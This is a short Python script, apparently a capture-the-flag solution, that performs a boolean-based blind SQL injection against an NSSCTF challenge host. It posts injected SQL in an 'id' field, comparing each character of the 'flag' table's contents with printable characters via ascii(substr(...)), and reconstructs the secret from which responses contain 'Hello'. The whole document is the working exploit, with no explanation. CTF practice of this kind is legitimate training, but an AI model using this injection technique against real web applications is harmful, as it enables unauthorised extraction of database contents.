import string
import requests
res=""
url="http://node4.anna.nssctf.cn:28878/index.php"
for i in range(1,60):
    for j in string.printable:
        sql=f"if(ascii(substr((select flag from flag),{i},1))={ord(j)},1,2)"
        post={"id":sql}
        result=requests.post(url=url,data=post)
        if 'Hello' in result.text:
            res+=j
            print(res)
        else:
          continue